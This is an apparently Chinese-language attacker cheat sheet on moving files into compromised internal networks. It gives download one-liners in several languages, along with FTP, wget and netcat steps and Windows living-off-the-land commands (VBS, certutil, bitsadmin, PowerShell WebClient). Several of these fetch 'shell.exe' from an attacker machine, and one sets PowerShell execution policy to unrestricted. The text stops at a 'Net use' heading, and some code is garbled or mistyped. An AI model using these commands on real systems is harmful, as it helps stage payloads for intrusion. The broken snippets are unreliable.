### **一、内网文件传输**

#### **（1）4种编程语言文件下载脚本**

php-S0.0.0.0:8090

python-mSimpleHTTPServer0.0.0.0:8090

python3-mhttp.service8080

python文件下载脚本

| #!python#!/usr/bin/pythonimport urllib2u = urllib2.urlopen('http://domain/file')localFile = open('local\_file', 'w')localFile.write(u.read())localFile.close() |
| --- |

php文件下载脚本

| #!/usr/bin/php<?php        $data = @file("http://example.com/file");        $lf = "local\_file";        $fh = fopen($lf, 'w');        fwrite($fh, $data\[0\]);        fclose($fh);?> |
| --- |

ruby文件下载脚本

| #!ruby#!/usr/bin/rubyrequire 'net/http'Net::HTTP.start("www.domain.com") { |http|r = http.get("/file")open("save\_location", "wb") { |file|file.write(r.body)}} |
| --- |

perl文件下载脚本

| #!perl#!/usr/bin/perluse LWP::Simple;getstore("http://domain/file", "file"); |
| --- |

 

#### **（2）ftp文件下载脚本**

linux一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。

| ftp 192.168.10.128usernamepasswordget fileexit |
| --- |

windows下，由于不会写bat脚本，只能交互的进行传输

| 1.open 目标IP:port2.输入账户3.密码4.下载文件:Get xx.exe5.上传文件:Put xx.exe备注：按help查看帮助信息Binary设置成二进制传输方式，方便传输exe/图片/视频 ![](../Images/2b9394e423ee2dcc8c1718817e64c2d6.png)  
ascii设置成ascii的传输方式默认方式，查看传输方式typeclose关闭连接 |
| --- |

 

#### **（3）Wget工具下载文件**

Wget是win和linux下的一个工具，允许非交互下载

wget http://192.168.10.128/file

#### **（4）Netcat工具传输文件**

上传： cat file| nc -l 1234

下载：nc host\_ip 1234> file

  

#### **二、WIN内网文件传输**

##### **（1）使用vbs文件下载脚本**

命令：Cscript down.vbs

 

| Set args = Wscript.ArgumentsUrl = "http://domain/file"dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")dim bStrm: Set bStrm = createobject("Adodb.Stream")xHttp.Open "GET", Url, FalsexHttp.Sendwith bStrm    .type = 1 '    .open    .write xHttp.responseBody    .savetofile " C:\\%homepath%\\file", 2 'end with |
| --- |

 

##### **（2）备份证书文件下载下载**

certutil -urlcache -split -f http://192.168.40.157:8090/shell.exe shell.exe

##### **（3）Bitsadmin下载命令：03，07，08，08r2过狗(管理员)**

作用：后台智能传输工具，系统的补丁、更新就是这样实现。

bitsadmin /transfer myDownLoadJob /download /prioritynormal "http://192.168.40.157:8090/shell.exe"  "c:\\\\shell.exe"

bitsadmin /transfer n http://domain/file c:\\\\shell.exe

注意：将shell.exe放在攻击机的真实web服务器的网站根目录下

##### **（4）Powershell文件下载脚本**

限制：有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。

| C:\\>powershell set-executionpolicy unrestricted |
| --- |

 

下面这两条指令实现了从Internet网络下载一个文件，写入脚本test.ps1。

| $p = New-Object System.Net.WebClient$p.DownloadFile("http://domain/file" "C:\\shell.exe") |
| --- |

命令：.\\test.ps1

 

##### **（5）Net use命令下载文件**
